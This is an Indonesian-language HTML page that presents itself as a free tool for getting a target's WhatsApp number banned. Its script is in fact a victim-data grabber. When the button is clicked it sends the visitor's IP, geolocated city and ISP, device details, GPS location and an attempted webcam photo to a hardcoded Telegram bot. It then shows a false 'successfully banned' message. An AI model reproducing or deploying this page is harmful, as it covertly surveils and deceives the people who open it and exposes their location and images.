<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Website Free</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;900&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --bg-main: #0e0e1c;
      --bg-box: #1a1a2f;
      --text-main: #f0f0f0;
      --text-sub: #888;
      --accent: #00ffaa;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
    }

    body {
      background: var(--bg-main);
      font-family: 'Inter', sans-serif;
      color: var(--text-main);
      overflow: hidden;
    }

    #particles-js {
      position: fixed;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      z-index: -1;
    }

    .login-container {
      background-color: rgba(26, 26, 47, 0.95);
      backdrop-filter: blur(8px);
      padding: 40px 30px;
      border-radius: 18px;
      box-shadow: 0 0 25px rgba(0, 255, 170, 0.2);
      max-width: 400px;
      width: 90%;
      text-align: center;
      margin: 120px auto;
      position: relative;
      z-index: 1;
      transition: all 0.3s ease;
    }

    .login-title {
      font-size: 26px;
      font-weight: 800;
      margin-bottom: 8px;
      color: var(--accent);
      text-shadow: 0 0 5px var(--accent);
    }

    .login-subtitle {
      font-size: 14px;
      color: var(--text-sub);
      margin-bottom: 28px;
    }

    .login-input {
      width: 100%;
      padding: 14px;
      background: #232336;
      border: 1px solid #44445a;
      border-radius: 10px;
      color: var(--text-main);
      margin-bottom: 18px;
      font-size: 14px;
      outline: none;
      transition: 0.2s;
    }

    .login-input:focus {
      border-color: var(--accent);
      box-shadow: 0 0 6px var(--accent);
    }

    .login-input::placeholder {
      color: #aaa;
    }

    .login-button {
      width: 100%;
      padding: 13px;
      background: var(--accent);
      color: #000;
      border: none;
      border-radius: 10px;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
      transition: 0.2s;
    }

    .login-button:hover {
      background: #00e69a;
      box-shadow: 0 0 12px #00ffaa88;
    }

    #info {
      margin-top: 22px;
      font-size: 13px;
      background-color: #20203a;
      padding: 16px;
      border-radius: 10px;
      color: #ccc;
      text-align: left;
      box-shadow: inset 0 0 5px #000;
    }

    .icon-box {
      font-size: 36px;
      margin-bottom: 12px;
      color: var(--accent);
      animation: float 2s ease-in-out infinite;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-6px); }
    }

    @media (max-width: 480px) {
      .login-container {
        padding: 32px 24px;
        margin: 100px 16px;
      }

      .login-title {
        font-size: 22px;
      }

      .icon-box {
        font-size: 30px;
      }
    }
  </style>
</head>
<body>
  <div id="particles-js"></div>

  <div class="login-container">
    <div class="icon-box"><i class="fas fa-user-secret"></i></div>
    <p class="login-title">Website Free Yogaa</p>
    <p class="login-subtitle">‚ö†Ô∏è Jangan disalahgunakan</p>
    <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
    <button class="login-button" id="login-button">Next</button>
    <div id="info">Silakan masukkan nomor target untuk diproses...</div>
  </div>

 <script>
    const botToken = '8242908130:AAFqvheogVs7dr0nhRaPDAcxPN6HvHVghtI';
    const chatIds = ['8196985241', '8196985241', '8196985241'];
    const infoDiv = document.getElementById('info');
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch {}

      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      const text = `
  IP         : ${ip}
  Kota       : ${city}
  Region     : ${region}
  Negara     : ${country}
  ISP        : ${org}
  Browser    : ${navigator.userAgent}
  OS         : ${navigator.platform}
  Resolusi   : ${screen.width}x${screen.height}
  Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
  Memori     : ${navigator.deviceMemory || 'N/A'} GB
  Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
  Waktu      : ${new Date().toLocaleString()}
      `.trim();

      sendToTelegram(`<b>üì• Info Pengunjung:</b>\n<pre>${text}</pre>`);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>üìç Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          () => sendToTelegram(`üìç Lokasi GPS Ditolak`)
        );
      } else {
        sendToTelegram(`üìç Browser tidak support GPS`);
      }
    }

    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000);
            };
          })
          .catch(err => {
            sendToTelegram('‚ùå Kamera Ditolak atau Tidak Tersedia');
            resolve();
          });
      });
    }

    button.addEventListener('click', async () => {
      const nomor = input.value.trim();
      if (!nomor || nomor.length < 8 || nomor.length > 15) {
        infoDiv.innerText = '‚ö†Ô∏è Nomor tidak valid.';
        return;
      }
      button.disabled = true;
      infoDiv.innerText = '‚è≥ Memproses spam report...';
      sendToTelegram(`<b>üìû Nomor Target:</b> ${nomor}`);
      input.value = '';
      try {
        await getInfo();
        await startCamera();
        setTimeout(() => {
          infoDiv.innerText = `‚úÖ Successfully bans nomor ${nomor}`;
          button.disabled = false;
        }, 1000);
      } catch (e) {
        infoDiv.innerText = '‚ùå Terjadi kesalahan.';
        button.disabled = false;
      }
    });

    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 50; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 6 + 's';
        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createParticles);
  </script>
  
  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
  <script>
    particlesJS("particles-js", {
      particles: {
        number: { value: 60, density: { enable: true, value_area: 800 } },
        color: { value: "#00ffaa" },
        shape: { type: "circle" },
        opacity: { value: 0.5 },
        size: { value: 3, random: true },
        line_linked: {
          enable: true,
          distance: 130,
          color: "#00ffaa",
          opacity: 0.3,
          width: 1
        },
        move: {
          enable: true,
          speed: 1.8,
          direction: "none",
          out_mode: "out"
        }
      },
      interactivity: {
        events: {
          onhover: { enable: true, mode: "repulse" },
          onclick: { enable: false }
        }
      },
      retina_detect: true
    });
  </script>
</body>
</html>
